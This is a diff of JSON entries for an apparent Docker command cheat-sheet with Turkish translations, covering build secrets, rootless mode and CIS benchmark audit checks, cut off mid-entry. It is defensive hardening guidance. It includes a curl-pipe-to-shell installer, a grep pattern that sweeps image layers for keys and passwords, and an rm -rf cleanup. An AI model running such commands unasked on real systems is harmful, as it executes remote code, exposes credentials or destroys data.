+            "cmd": "echo '{ \"features\": { \"buildkit\": true } }' | sudo tee /etc/docker/daemon.json",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pass a secret file at build time",
+            "desc": "Mount a host file as a build secret without baking it into layers.",
+            "desc_tr": "Bir host dosyasini katmanlara gomulmeden build secret olarak baglar.",
+            "cmd": "docker build --secret id=mysecret,src=<FILE> -t <IMAGE> .",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Consume a build secret in a RUN step",
+            "desc": "Dockerfile syntax to read a mounted secret only during one RUN.",
+            "desc_tr": "Bir secret'i yalnizca tek RUN sirasinda okuyan Dockerfile sozdizimi.",
+            "cmd": "RUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret",
+            "tags": [
+              "essential"
+            ],
+            "note": "Secret katmanda kalmaz; build bitince tmpfs mount kaldirilir."
+          },
+          {
+            "title": "Pass a secret from an environment variable",
+            "desc": "Forward an env var into the build as a secret (env= source).",
+            "desc_tr": "Bir ortam degiskenini build'e secret olarak (env= kaynagi) iletir.",
+            "cmd": "docker build --secret id=token,env=GITHUB_TOKEN -t <IMAGE> .",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Read a secret via custom target path",
+            "desc": "Mount the secret at a specific path instead of /run/secrets.",
+            "desc_tr": "Secret'i /run/secrets yerine belirli bir yola baglar.",
+            "cmd": "RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm install",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Make a build secret required",
+            "desc": "Fail the build if the secret is not provided (required=true).",
+            "desc_tr": "Secret verilmezse build'i basarisiz kilar (required=true).",
+            "cmd": "RUN --mount=type=secret,id=apikey,required=true ./deploy.sh",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Override secret file permissions and ownership",
+            "desc": "Set mode/uid/gid on the mounted secret for non-root build steps.",
+            "desc_tr": "Root olmayan build adimlari icin baglanan secret'in mode/uid/gid degerlerini ayarlar.",
+            "cmd": "RUN --mount=type=secret,id=key,uid=1000,mode=0400 cat /run/secrets/key",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Use buildx to pass a secret",
+            "desc": "Same secret flag works with docker buildx build for multi-platform.",
+            "desc_tr": "Ayni secret bayragi cok-platformlu docker buildx build ile de calisir.",
+            "cmd": "docker buildx build --secret id=mysecret,src=<FILE> -t <IMAGE> .",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Mount an SSH agent for private git pulls",
+            "desc": "Forward the host SSH agent into a RUN step without copying keys.",
+            "desc_tr": "Anahtarlari kopyalamadan host SSH agent'ini bir RUN adimina iletir.",
+            "cmds": [
+              "docker build --ssh default -t <IMAGE> .",
+              "RUN --mount=type=ssh git clone git@<DOMAIN>:org/repo.git"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Once eval $(ssh-agent) ve ssh-add ile anahtari agent'a ekleyin."
+          },
+          {
+            "title": "Pass a named SSH socket",
+            "desc": "Expose a specific SSH agent socket id into the build.",
+            "desc_tr": "Belirli bir SSH agent soketini id ile build'e acar.",
+            "cmd": "docker build --ssh github=$SSH_AUTH_SOCK -t <IMAGE> .",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Inspect image history for leaked secrets",
+            "desc": "Show every layer command to spot secrets baked via RUN/ENV/ARG.",
+            "desc_tr": "RUN/ENV/ARG ile gomulen secret'lari yakalamak icin her katman komutunu gosterir.",
+            "cmd": "docker history --no-trunc <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Dump image config and env vars",
+            "desc": "Inspect the image to find secrets accidentally stored in ENV.",
+            "desc_tr": "Yanlislikla ENV'e konan secret'lari bulmak icin imaj yapilandirmasini inceler.",
+            "cmd": "docker inspect <IMAGE> --format '{{json .Config.Env}}'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Search filesystem layers for credentials",
+            "desc": "Save the image and grep extracted layers for secret patterns.",
+            "desc_tr": "Imaji kaydedip cikartilan katmanlari secret kaliplari icin grep'ler.",
+            "cmds": [
+              "docker save <IMAGE> -o image.tar",
+              "mkdir layers && tar -xf image.tar -C layers",
+              "grep -rIE 'api[_-]?key|password|BEGIN.*PRIVATE KEY|AKIA[0-9A-Z]{16}' layers/"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Scan an image for secrets with Trivy",
+            "desc": "Use Trivy's secret scanner to detect embedded credentials.",
+            "desc_tr": "Gomulu kimlik bilgilerini saptamak icin Trivy'nin secret tarayicisini kullanir.",
+            "cmd": "trivy image --scanners secret <IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Scan image layers with Gitleaks",
+            "desc": "Detect secrets across a checked-out or extracted image directory.",
+            "desc_tr": "Cikartilmis bir imaj dizininde secret'lari saptar.",
+            "cmd": "gitleaks dir layers/ --report-format json --report-path leaks.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Explore image layers with dive",
+            "desc": "Inspect layers interactively to find files leaking secrets.",
+            "desc_tr": "Secret sizdiran dosyalari bulmak icin katmanlari interaktif inceler.",
+            "cmd": "dive <IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Anti-pattern: secret leaked via build ARG",
+            "desc": "ARG values are visible in docker history, never use for secrets.",
+            "desc_tr": "ARG degerleri docker history'de gorunur; secret icin asla kullanmayin.",
+            "cmd": "docker build --build-arg API_KEY=<SECRET> -t <IMAGE> .   # AVOID",
+            "tags": [
+              "essential"
+            ],
+            "note": "Bu deger history ile sizar; --secret kullanin."
+          },
+          {
+            "title": "Anti-pattern: COPY then delete a secret file",
+            "desc": "Deleting in a later layer still leaves the secret in earlier layers.",
+            "desc_tr": "Sonraki katmanda silmek secret'i onceki katmanlarda birakir.",
+            "cmds": [
+              "COPY id_rsa /root/.ssh/id_rsa   # AVOID",
+              "RUN use-key && rm /root/.ssh/id_rsa   # still recoverable from layer"
+            ],
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pass secrets to docker run as files (tmpfs)",
+            "desc": "Inject runtime secrets via tmpfs mount instead of -e env vars.",
+            "desc_tr": "Calisma zamani secret'larini -e yerine tmpfs mount ile dosya olarak verir.",
+            "cmd": "docker run --mount type=tmpfs,destination=/run/secrets <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Create a Docker Swarm secret",
+            "desc": "Store a secret in Swarm's encrypted Raft store for services.",
+            "desc_tr": "Servisler icin secret'i Swarm'in sifreli Raft deposunda saklar.",
+            "cmd": "printf '<SECRET>' | docker secret create my_secret -",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Attach a Swarm secret to a service",
+            "desc": "Mount a Swarm secret at /run/secrets in service tasks.",
+            "desc_tr": "Bir Swarm secret'ini servis gorevlerinde /run/secrets altina baglar.",
+            "cmd": "docker service create --secret my_secret --name <CONTAINER> <IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Use Compose build secrets",
+            "desc": "Define secrets in compose and reference them in the build block.",
+            "desc_tr": "Compose'da secret tanimlar ve build blogunda referans verir.",
+            "cmds": [
+              "# compose.yaml",
+              "secrets:\n  npm_token:\n    file: <FILE>",
+              "services:\n  app:\n    build:\n      context: .\n      secrets: [npm_token]",
+              "docker compose build"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Use Compose runtime secrets",
+            "desc": "Mount secrets into running containers at /run/secrets via compose.",
+            "desc_tr": "Compose ile calisan konteynerlere /run/secrets altinda secret baglar.",
+            "cmds": [
+              "services:\n  app:\n    secrets: [db_password]",
+              "secrets:\n  db_password:\n    environment: DB_PASSWORD",
+              "docker compose up -d"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Avoid committing .env to images",
+            "desc": "Add sensitive files to .dockerignore so COPY . never grabs them.",
+            "desc_tr": ".env gibi dosyalari .dockerignore'a ekleyerek COPY . ile gomulmesini onler.",
+            "cmd": "printf '.env\\n*.pem\\nid_rsa\\n.git\\n' >> .dockerignore",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Verify a secret never persists in the final image",
+            "desc": "Build, then grep the running container for the secret string.",
+            "desc_tr": "Build sonrasi calisan konteynerde secret dizgesini grep ederek dogrular.",
+            "cmd": "docker run --rm <IMAGE> sh -c 'grep -r \"<SECRET>\" / 2>/dev/null || echo clean'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Inject secrets from a vault during build",
+            "desc": "Pipe a secret fetched from a manager straight into --secret via env.",
+            "desc_tr": "Bir gizli yoneticiden alinan secret'i env ile dogrudan --secret'a aktarir.",
+            "cmd": "VAULT_TOKEN=$(vault kv get -field=token secret/ci) docker build --secret id=token,env=VAULT_TOKEN -t <IMAGE> .",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Secret kabuk gecmisine girmesin; degisken inline export edilir."
+          },
+          {
+            "title": "Pin the dockerfile frontend syntax for secret support",
+            "desc": "Set the syntax directive so --mount=type=secret is guaranteed.",
+            "desc_tr": "--mount=type=secret'in garanti olmasi icin syntax direktifini sabitler.",
+            "cmd": "# syntax=docker/dockerfile:1.7",
+            "tags": [
+              "essential"
+            ],
+            "note": "Dockerfile'in ilk satiri olmali; eski frontend secret mount'u tanimaz."
+          }
+        ]
+      },
+      {
+        "name": "Rootless & User Namespaces",
+        "commands": [
+          {
+            "title": "Install Rootless Docker",
+            "desc": "Install the rootless Docker daemon for the current non-root user",
+            "desc_tr": "Mevcut root olmayan kullanıcı için rootless Docker daemon'unu kur",
+            "cmd": "curl -fsSL https://get.docker.com/rootless | sh",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Requires uidmap package (newuidmap/newgidmap) and subuid/subgid entries for the user."
+          },
+          {
+            "title": "Rootless Setup Tool",
+            "desc": "Set up the rootless systemd user service and environment",
+            "desc_tr": "Rootless systemd kullanıcı servisini ve ortamını kur",
+            "cmd": "dockerd-rootless-setuptool.sh install",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Check Rootless Prerequisites",
+            "desc": "Verify the host meets all rootless mode requirements",
+            "desc_tr": "Sunucunun tüm rootless mod gereksinimlerini karşıladığını doğrula",
+            "cmd": "dockerd-rootless-setuptool.sh check",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Set Rootless DOCKER_HOST",
+            "desc": "Point the CLI at the rootless daemon's user socket",
+            "desc_tr": "CLI'yi rootless daemon'un kullanıcı soketine yönlendir",
+            "cmd": "export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Start Rootless Daemon (systemd)",
+            "desc": "Start the per-user rootless Docker service",
+            "desc_tr": "Kullanıcıya özel rootless Docker servisini başlat",
+            "cmd": "systemctl --user start docker",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Enable Rootless Daemon on Boot",
+            "desc": "Auto-start the rootless daemon at boot without an active login session",
+            "desc_tr": "Aktif oturum olmadan rootless daemon'u açılışta otomatik başlat",
+            "cmds": [
+              "systemctl --user enable docker",
+              "sudo loginctl enable-linger $(whoami)"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "enable-linger keeps the user service running after logout."
+          },
+          {
+            "title": "Verify Rootless Mode",
+            "desc": "Confirm the daemon reports rootless and which security options are active",
+            "desc_tr": "Daemon'un rootless çalıştığını ve aktif güvenlik seçeneklerini doğrula",
+            "cmd": "docker info -f '{{println .SecurityOptions}}'",
+            "tags": [
+              "essential"
+            ],
+            "note": "Look for 'name=rootless' in the output."
+          },
+          {
+            "title": "Inspect subuid/subgid Ranges",
+            "desc": "Show the subordinate UID/GID ranges allocated for user namespace mapping",
+            "desc_tr": "Kullanıcı namespace eşlemesi için ayrılan alt UID/GID aralıklarını göster",
+            "cmd": "grep $(whoami) /etc/subuid /etc/subgid",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Add subuid/subgid Mapping",
+            "desc": "Allocate a 65536-wide subordinate ID range required for user namespaces",
+            "desc_tr": "Kullanıcı namespace'leri için gereken 65536 genişliğindeki alt ID aralığını ayır",
+            "cmds": [
+              "sudo usermod --add-subuids 100000-165535 <USER>",
+              "sudo usermod --add-subgids 100000-165535 <USER>"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enable userns-remap (Rootful Daemon)",
+            "desc": "Remap container root to an unprivileged host user on the standard daemon",
+            "desc_tr": "Standart daemon'da konteyner root'unu yetkisiz bir host kullanıcısına eşle",
+            "cmds": [
+              "echo '{ \"userns-remap\": \"default\" }' | sudo tee /etc/docker/daemon.json",
+              "sudo systemctl restart docker"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Creates the 'dockremap' user and remaps the whole daemon's containers."
+          },
+          {
+            "title": "Run Container with Specific userns Remap",
+            "desc": "Disable user-namespace remapping for a single container when remap is enabled",
+            "desc_tr": "Remap etkinken tek bir konteyner için kullanıcı namespace eşlemesini devre dışı bırak",
+            "cmd": "docker run --userns=host <IMAGE>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Use sparingly; --userns=host weakens isolation for that container."
+          },
+          {
+            "title": "Map Container Root to Host User (UID Map)",
+            "desc": "Run the container process as the invoking host user's UID/GID",
+            "desc_tr": "Konteyner sürecini çağıran host kullanıcısının UID/GID'siyle çalıştır",
+            "cmd": "docker run --user $(id -u):$(id -g) <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Verify In-Container vs Host UID",
+            "desc": "Compare the in-container UID with the mapped host UID under rootless mode",
+            "desc_tr": "Rootless modda konteyner içi UID ile eşlenen host UID'sini karşılaştır",
+            "cmd": "docker run --rm <IMAGE> id; id",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Find Host PID of Container Root",
+            "desc": "List container processes with the unprivileged host user they map to",
+            "desc_tr": "Konteyner süreçlerini eşlendikleri yetkisiz host kullanıcısıyla listele",
+            "cmd": "docker top <CONTAINER> -o pid,user,comm",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Inspect Daemon Root Directory",
+            "desc": "Show the rootless data-root, typically under ~/.local/share/docker",
+            "desc_tr": "Rootless veri kök dizinini göster (genellikle ~/.local/share/docker altında)",
+            "cmd": "docker info -f '{{.DockerRootDir}}'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Expose Privileged Port Rootless",
+            "desc": "Allow rootless containers to publish ports below 1024",
+            "desc_tr": "Rootless konteynerlerin 1024 altındaki portları yayınlamasına izin ver",
+            "cmds": [
+              "sudo setcap cap_net_bind_service=ep $(which rootlesskit)",
+              "systemctl --user restart docker"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Alternatively lower net.ipv4.ip_unprivileged_port_start via sysctl."
+          },
+          {
+            "title": "Lower Unprivileged Port Start",
+            "desc": "Permit binding low ports without granting capabilities to rootlesskit",
+            "desc_tr": "rootlesskit'e yetenek vermeden düşük portlara bağlanmaya izin ver",
+            "cmd": "sudo sysctl -w net.ipv4.ip_unprivileged_port_start=80",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Run with new-privileges Disabled",
+            "desc": "Block setuid binaries from gaining privileges, complementing rootless isolation",
+            "desc_tr": "setuid binary'lerin yetki kazanmasını engelle, rootless izolasyonunu tamamla",
+            "cmd": "docker run --security-opt=no-new-privileges <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Drop All Capabilities",
+            "desc": "Remove all Linux capabilities so even mapped root has no special powers",
+            "desc_tr": "Tüm Linux yeteneklerini kaldır, böylece eşlenen root bile özel güce sahip olmasın",
+            "cmd": "docker run --cap-drop=ALL <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect Container User Namespace Mode",
+            "desc": "Show whether a container runs in host or remapped user namespace",
+            "desc_tr": "Konteynerin host mu yoksa eşlenmiş kullanıcı namespace'inde mi çalıştığını göster",
+            "cmd": "docker inspect -f '{{.HostConfig.UsernsMode}}' <CONTAINER>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Read Container uid_map",
+            "desc": "Dump the kernel UID mapping table of a running container's namespace",
+            "desc_tr": "Çalışan bir konteynerin namespace'inin kernel UID eşleme tablosunu dök",
+            "cmd": "docker inspect -f '{{.State.Pid}}' <CONTAINER> | xargs -I{} sudo cat /proc/{}/uid_map",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enter Container User Namespace",
+            "desc": "Join a container's user, PID and mount namespaces for inspection",
+            "desc_tr": "İnceleme için konteynerin kullanıcı, PID ve mount namespace'lerine katıl",
+            "cmd": "sudo nsenter -t $(docker inspect -f '{{.State.Pid}}' <CONTAINER>) -U -p -m bash",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Run Rootless with seccomp Profile",
+            "desc": "Apply an explicit seccomp profile alongside user-namespace isolation",
+            "desc_tr": "Kullanıcı namespace izolasyonunun yanında açık bir seccomp profili uygula",
+            "cmd": "docker run --security-opt seccomp=<FILE>.json <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Uninstall Rootless Docker",
+            "desc": "Remove the rootless service and clean up the user environment",
+            "desc_tr": "Rootless servisini kaldır ve kullanıcı ortamını temizle",
+            "cmd": "dockerd-rootless-setuptool.sh uninstall",
+            "tags": [
+              "tool"
+            ],
+            "note": "Run 'rootlesskit rm -rf ~/.local/share/docker' afterwards to delete data."
+          },
+          {
+            "title": "Check unprivileged_userns_clone Setting",
+            "desc": "Verify the kernel allows unprivileged user namespace creation (Debian/Ubuntu)",
+            "desc_tr": "Kernel'in yetkisiz kullanıcı namespace oluşturmaya izin verdiğini doğrula (Debian/Ubuntu)",
+            "cmd": "sysctl kernel.unprivileged_userns_clone",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Must be 1 for rootless Docker; enable with 'sysctl -w kernel.unprivileged_userns_clone=1'."
+          },
+          {
+            "title": "Run Podman Rootless Container",
+            "desc": "Run a rootless Podman container keeping your host UID inside the container",
+            "desc_tr": "Host UID'nizi konteyner içinde koruyarak rootless Podman konteyneri çalıştır",
+            "cmd": "podman run --userns=keep-id <IMAGE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Inspect Podman userns Mapping",
+            "desc": "Show the UID mapping inside Podman's rootless user namespace",
+            "desc_tr": "Podman'ın rootless kullanıcı namespace'i içindeki UID eşlemesini göster",
+            "cmd": "podman unshare cat /proc/self/uid_map",
+            "tags": [
+              "tool"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "CIS Docker Benchmark (docker-bench-security)",
+        "commands": [
+          {
+            "title": "Run docker-bench-security (official image)",
+            "desc": "Run the full CIS Docker Benchmark audit using the official image",
+            "desc_tr": "Resmi imaj ile tam CIS Docker Benchmark denetimini çalıştırır",
+            "cmd": "docker run --rm --net host --pid host --userns host --cap-add audit_control -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST -v /etc:/etc:ro -v /usr/bin/containerd:/usr/bin/containerd:ro -v /usr/bin/runc:/usr/bin/runc:ro -v /usr/lib/systemd:/usr/lib/systemd:ro -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro --label docker_bench_security docker/docker-bench-security",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Mounting host paths read-only (:ro) is safer than the legacy read-write example; the script only needs to inspect configs."
+          },
+          {
+            "title": "Clone and run docker-bench from source",
+            "desc": "Clone the GitHub repo and run the audit script directly on the host",
+            "desc_tr": "GitHub deposunu klonlar ve denetim betiğini doğrudan host üzerinde çalıştırır",
+            "cmds": [
+              "git clone https://github.com/docker/docker-bench-security.git",
+              "cd docker-bench-security",
+              "sudo sh docker-bench.sh"
+            ],
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Run specific CIS checks only",
+            "desc": "Limit the audit to specific benchmark check groups with -c",
+            "desc_tr": "Denetimi -c ile belirli benchmark kontrol gruplarıyla sınırlar",
+            "cmd": "sudo sh docker-bench.sh -c container_images,docker_daemon_configuration",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Valid groups: host_configuration, docker_daemon_configuration, docker_daemon_configuration_files, container_images, container_runtime, docker_security_operations, docker_swarm_configuration."
+          },
+          {
+            "title": "Exclude check groups from the audit",
+            "desc": "Run all checks except the listed groups with -e",
+            "desc_tr": "Listelenen gruplar hariç tüm kontrolleri -e ile çalıştırır",
+            "cmd": "sudo sh docker-bench.sh -e docker_swarm_configuration",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Export benchmark results to JSON",
+            "desc": "Generate machine-readable JSON output for CI pipelines",
+            "desc_tr": "CI pipeline'ları için makine tarafından okunabilir JSON çıktısı üretir",
+            "cmd": "sudo sh docker-bench.sh -l /tmp/docker-bench.log -c container_images && cat /tmp/docker-bench.log.json",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "The -l flag sets the base log path; the script also writes <logpath>.json automatically."
+          },
+          {
+            "title": "Check only failed/warning findings",
+            "desc": "Run audit including remediation checks and filter WARN lines",
+            "desc_tr": "İyileştirme kontrolleriyle denetimi çalıştırır ve WARN satırlarını filtreler",
+            "cmd": "sudo sh docker-bench.sh -i | grep -E '\\[WARN\\]'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Verify Docker daemon socket ownership (CIS 3.15)",
+            "desc": "Check ownership and permissions of the Docker daemon socket",
+            "desc_tr": "Docker daemon soketinin sahipliğini ve izinlerini kontrol eder",
+            "cmd": "ls -l /var/run/docker.sock",
+            "tags": [
+              "essential"
+            ],
+            "note": "CIS 3.15: docker.sock ownership should be root:docker and permissions 660 or stricter."
+          },
+          {
+            "title": "Audit Docker daemon files & directories (auditd)",
+            "desc": "Verify auditing is configured for the Docker daemon (CIS 1.1.x)",
+            "desc_tr": "Docker daemon için denetim kaydının yapılandırıldığını doğrular (CIS 1.1.x)",
+            "cmd": "sudo auditctl -l | grep -E '/usr/bin/dockerd|/var/lib/docker|/etc/docker'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Add rules like '-w /usr/bin/dockerd -k docker' to /etc/audit/rules.d/audit.rules then run 'augenrules --load'."
+          },
+          {
+            "title": "Inspect daemon.json for secure defaults",
+            "desc": "Review the Docker daemon configuration for hardening options",
+            "desc_tr": "Sıkılaştırma seçenekleri için Docker daemon yapılandırmasını inceler",
+            "cmd": "sudo cat /etc/docker/daemon.json",
+            "tags": [
+              "essential"
+            ],
+            "note": "Look for icc:false, userns-remap, no-new-privileges:true, live-restore:true, and userland-proxy:false."
+          },
+          {
+            "title": "Verify ICC (inter-container communication) disabled",
+            "desc": "Confirm the default bridge restricts inter-container traffic (CIS 2.1)",
+            "desc_tr": "Varsayılan bridge'in konteynerler arası trafiği kısıtladığını doğrular (CIS 2.1)",
+            "cmd": "docker network inspect bridge --format '{{ index .Options \"com.docker.network.bridge.enable_icc\" }}'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Check live-restore is enabled (CIS 2.14)",
+            "desc": "Verify containers keep running during daemon downtime",
+            "desc_tr": "Daemon kapalıyken konteynerlerin çalışmaya devam ettiğini doğrular",
+            "cmd": "docker info --format '{{ .LiveRestoreEnabled }}'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Confirm user namespace remapping (CIS 2.8)",
+            "desc": "Check whether userns-remap is active to isolate container root",
+            "desc_tr": "Konteyner root'unu izole etmek için userns-remap'in etkin olduğunu kontrol eder",
+            "cmd": "docker info --format 'SecurityOptions: {{ .SecurityOptions }}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Look for 'name=userns' in the SecurityOptions output."
+          },
+          {
+            "title": "List containers running as privileged (CIS 5.4)",
+            "desc": "Find privileged containers that bypass kernel restrictions",
+            "desc_tr": "Çekirdek kısıtlamalarını aşan privileged konteynerleri bulur",
+            "cmd": "docker ps -q | xargs -I {} docker inspect --format '{{ .Name }}: Privileged={{ .HostConfig.Privileged }}' {}",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Detect containers with host network namespace (CIS 5.9)",
+            "desc": "Find containers sharing the host network stack",
+            "desc_tr": "Host ağ yığınını paylaşan konteynerleri bulur",
+            "cmd": "docker ps -q | xargs docker inspect --format '{{ .Name }}: {{ .HostConfig.NetworkMode }}'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Check read-only root filesystem (CIS 5.12)",
+            "desc": "Verify which containers mount their root filesystem read-only",
+            "desc_tr": "Hangi konteynerlerin kök dosya sistemini salt-okunur bağladığını doğrular",
+            "cmd": "docker ps -q | xargs docker inspect --format '{{ .Name }}: ReadonlyRootfs={{ .HostConfig.ReadonlyRootfs }}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit container capabilities (CIS 5.3)",
+            "desc": "List dropped and added Linux capabilities for a container",
+            "desc_tr": "Bir konteyner için bırakılan ve eklenen Linux yeteneklerini listeler",
+            "cmd": "docker inspect --format 'CapAdd={{ .HostConfig.CapAdd }} CapDrop={{ .HostConfig.CapDrop }}' <CONTAINER>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Best practice: --cap-drop=ALL then add back only required capabilities."
+          },
+          {
+            "title": "Verify no-new-privileges is set (CIS 5.25)",
+            "desc": "Confirm a container cannot gain new privileges via setuid binaries",
+            "desc_tr": "Bir konteynerin setuid ikili dosyalarıyla yeni ayrıcalık kazanamayacağını doğrular",
+            "cmd": "docker inspect --format '{{ .HostConfig.SecurityOpt }}' <CONTAINER>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Output should contain 'no-new-privileges'. Run with: docker run --security-opt=no-new-privileges <IMAGE>."
+          },
+          {
+            "title": "Find containers with unrestricted memory (CIS 5.10)",
+            "desc": "List containers that have no memory limit configured",
+            "desc_tr": "Bellek limiti tanımlanmamış konteynerleri listeler",
+            "cmd": "docker ps -q | xargs docker inspect --format '{{ .Name }}: Memory={{ .HostConfig.Memory }}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "A value of 0 means unlimited memory; set --memory at run time to bound usage."
+          },
+          {
+            "title": "Check CPU shares / limits (CIS 5.11)",
+            "desc": "Verify containers have CPU priority limits set",
+            "desc_tr": "Konteynerlerin CPU önceliği limitlerine sahip olduğunu doğrular",
+            "cmd": "docker ps -q | xargs docker inspect --format '{{ .Name }}: CpuShares={{ .HostConfig.CpuShares }}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Detect containers that mounted the Docker socket (CIS 5.31)",
+            "desc": "Find containers with /var/run/docker.sock bind-mounted (a major escape risk)",
+            "desc_tr": "/var/run/docker.sock bağlanmış konteynerleri bulur (büyük bir kaçış riski)",
+            "cmd": "docker ps -q | xargs docker inspect --format '{{ .Name }}: {{ range .Mounts }}{{ .Source }} {{ end }}' | grep docker.sock",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Verify bounded restart policy (CIS 5.14)",
+            "desc": "Check that on-failure restart attempts are limited to 5",
+            "desc_tr": "on-failure yeniden başlatma denemelerinin 5 ile sınırlı olduğunu kontrol eder",
+            "cmd": "docker inspect --format 'RestartPolicy={{ .HostConfig.RestartPolicy.Name }} MaxRetry={{ .HostConfig.RestartPolicy.MaximumRetryCount }}' <CONTAINER>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Check default seccomp profile is applied (CIS 5.21)",
+            "desc": "Verify the container is not running with seccomp disabled",
+            "desc_tr": "Konteynerin seccomp devre dışı bırakılmadan çalıştığını doğrular",
+            "cmd": "docker inspect --format '{{ .HostConfig.SecurityOpt }}' <CONTAINER> | grep -q 'seccomp:unconfined' && echo 'UNCONFINED (FAIL)' || echo 'default seccomp OK'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Confirm AppArmor / SELinux profile in use (CIS 5.1)",
+            "desc": "Inspect the MAC (mandatory access control) profile on a container",
+            "desc_tr": "Bir konteynerdeki MAC (zorunlu erişim kontrolü) profilini inceler",
+            "cmd": "docker inspect --format 'AppArmor={{ .AppArmorProfile }} SecurityOpt={{ .HostConfig.SecurityOpt }}' <CONTAINER>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Verify Docker Content Trust is enabled (CIS 4.5)",
+            "desc": "Enable image signature verification for pulls and builds",
+            "desc_tr": "Çekme ve derleme işlemleri için imaj imza doğrulamasını etkinleştirir",
+            "cmd": "export DOCKER_CONTENT_TRUST=1 && docker pull <REGISTRY>/<IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Detect images running as root USER (CIS 4.1)",
+            "desc": "Check the configured user of an image; empty means root",
+            "desc_tr": "Bir imajın yapılandırılmış kullanıcısını kontrol eder; boş ise root demektir",
+            "cmd": "docker inspect --format 'User={{ .Config.User }}' <IMAGE>",
+            "tags": [
+              "essential"
+            ],
+            "note": "An empty User field is CIS-noncompliant; add a non-root USER directive in the Dockerfile."
+          },
+          {
+            "title": "Check HEALTHCHECK presence in images (CIS 4.6)",
+            "desc": "Verify an image defines a HEALTHCHECK instruction",
+            "desc_tr": "Bir imajın HEALTHCHECK talimatı tanımladığını doğrular",
+            "cmd": "docker inspect --format '{{ if .Config.Healthcheck }}HAS HEALTHCHECK{{ else }}NONE (WARN){{ end }}' <IMAGE>",
